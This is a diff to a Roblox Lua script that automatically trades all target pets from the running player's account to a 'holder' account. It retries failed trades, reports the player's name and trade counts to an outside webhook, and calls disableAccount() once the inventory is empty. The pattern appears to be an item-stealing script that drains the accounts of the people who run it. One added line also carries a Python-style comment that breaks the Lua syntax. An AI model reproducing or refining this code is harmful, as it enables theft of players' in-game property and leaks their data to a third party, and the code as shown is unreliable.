@@ -246,7 +246,7 @@ local function count_pets_in_inventory()
     return count
 end
 
--- Auto-trade with better completion detection
+-- Auto-trade with better completion detection and retry logic
 local function autotrade(username)
     if trade_status then
         return false
@@ -262,6 +262,14 @@ local function autotrade(username)
     pcall(function()
         trade_status = true
         
+        -- Verify holder is ACTUALLY in game
+        local holder = Players:FindFirstChild(username)
+        if not holder then
+            warn(string.format("❌ %s is NOT in the server!", username))
+            trade_status = false
+            return false
+        end
+        
         -- Count pets BEFORE trade
         local pets_before = count_pets_in_inventory()
         print(string.format("📦 Pets in inventory before trade: %d", pets_before))
@@ -275,20 +283,36 @@ local function autotrade(username)
             return false
         end
         
-        print("📤 Trade request sent to " .. username)
+        print(string.format("📤 Trade request sent to %s", username))
         task.wait(3)
         
-        -- Wait for trade window to open
+        -- Wait for trade window to open (with better timeout handling)
+        print("⏳ Waiting for trade window to open...")
         local timeout = 0
-        while not tradeGui.Visible and timeout < 15 do
+        local max_wait = 20  -- Increased from 15
+        
+        while not tradeGui.Visible and timeout < max_wait do
+            -- Check if holder is still in game
+            if not Players:FindFirstChild(username) then
+                warn(string.format("❌ %s left the game while waiting!", username))
+                trade_status = false
+                return false
+            end
+            
             task.wait(0.5)
             timeout = timeout + 0.5
+            
+            -- Print status every 5 seconds
+            if timeout % 5 == 0 then
+                print(string.format("   Still waiting... (%ds/%ds) - Holder might be busy", timeout, max_wait))
+            end
         end
         
-        if timeout >= 15 then
-            warn("❌ Trade window didn't open")
+        if timeout >= max_wait then
+            -- Trade window didn't open - holder is BUSY, not gone!
+            warn(string.format("⚠️ Trade window didn't open after %ds - Holder likely busy in another trade", max_wait))
             trade_status = false
-            return false
+            return false  -- Will retry
         end
         
         print("✅ Trade window opened")
@@ -324,7 +348,7 @@ local function autotrade(username)
         -- Wait for trade to close
         print("⏳ Waiting for trade to complete...")
         timeout = 0
-        local max_wait = 30
+        max_wait = 30
         
         while tradeGui.Visible and timeout < max_wait do
             task.wait(0.5)
@@ -446,27 +470,51 @@ local tradesNeeded = math.ceil(#pets_unique_ids / 18)
 print(string.format("\n🔄 Will need approximately %d trade(s)...\n", tradesNeeded))
 
 local tradeAttempts = 0
-local maxTrades = tradesNeeded + 5
+local maxTrades = tradesNeeded + 10  -- Increased retry attempts
+local consecutiveFailures = 0
+local maxConsecutiveFailures = 3
 
 while #pets_unique_ids > 0 and tradeAttempts < maxTrades do
     tradeAttempts = tradeAttempts + 1
     
     print(string.format("\n=== Trade Attempt %d ===", tradeAttempts))
     
-    -- Check if holder still in server
-    if not Players:FindFirstChild(selected_holder) then
-        warn(string.format("⚠️ %s left the game!", selected_holder))
+    -- CRITICAL: Check if holder is ACTUALLY in server (not just busy)
+    local holder = Players:FindFirstChild(selected_holder)
+    if not holder then
+        warn(string.format("❌ %s actually LEFT the game!", selected_holder))
         local traded_so_far = initial_pet_count - #pets_unique_ids
-        sendWebhook(string.format("⚠️ %s - Incomplete - Player Left (Traded: %d/%d)", playerName, traded_so_far, initial_pet_count))
-        break
+        sendWebhook(string.format("❌ %s - HOLDER LEFT - Traded: %d/%d pets before disconnect", playerName, traded_so_far, initial_pet_count))
+        break  -- Stop trying, holder is gone
     end
     
     local success = autotrade(selected_holder)
     
     if not success then
-        warn("Trade attempt failed, retrying...")
-        task.wait(3)
+        consecutiveFailures = consecutiveFailures + 1
+        
+        -- Check if holder is still in game before deciding what to do
+        if Players:FindFirstChild(selected_holder) then
+            -- Holder is in game, just busy or failed - RETRY
+            warn(string.format("⚠️ Trade attempt failed (%d/%d consecutive) - Holder still in game, retrying...", consecutiveFailures, maxConsecutiveFailures))
+            
+            if consecutiveFailures >= maxConsecutiveFailures then
+                warn(string.format("⚠️ %d consecutive failures - Holder might be AFK or busy. Waiting longer...", consecutiveFailures))
+                task.wait(10)  -- Wait longer before retry
+                consecutiveFailures = 0  # Reset counter
+            else
+                task.wait(5)  -- Normal retry wait
+            end
+        else
+            -- Holder actually left
+            warn(string.format("❌ %s left during trade attempt!", selected_holder))
+            local traded_so_far = initial_pet_count - #pets_unique_ids
+            sendWebhook(string.format("❌ %s - HOLDER LEFT - Traded: %d/%d pets", playerName, traded_so_far, initial_pet_count))
+            break
+        end
     else
+        -- Success! Reset failure counter
+        consecutiveFailures = 0
         task.wait(3)
     end
 end
@@ -498,10 +546,16 @@ local remaining_pets = count_pets_in_inventory()
 
 if remaining_pets == 0 then
     print("🔴 All pets traded - Disabling account...")
+    task.wait(2)
     disableAccount()
+elseif #pets_unique_ids == 0 then
+    -- Target pets are done, but other pets remain
+    print(string.format("✅ All target pets traded - %d other pets remain - NOT disabling", remaining_pets))
+    sendWebhook(string.format("✅ %s - Target pets complete - %d other pets remain - NOT DISABLED", playerName, remaining_pets))
 else
-    print(string.format("⚠️ Still have %d pets - NOT disabling account", remaining_pets))
-    sendWebhook(string.format("⚠️ %s - Has %d pets remaining - NOT DISABLED", playerName, remaining_pets))
+    -- Still have target pets remaining (incomplete)
+    print(string.format("⚠️ Still have %d target pets to trade - NOT disabling account", #pets_unique_ids))
+    sendWebhook(string.format("⚠️ %s - INCOMPLETE - %d target pets remaining - NOT DISABLED", playerName, #pets_unique_ids))
 end
 
 print("\n========================================")
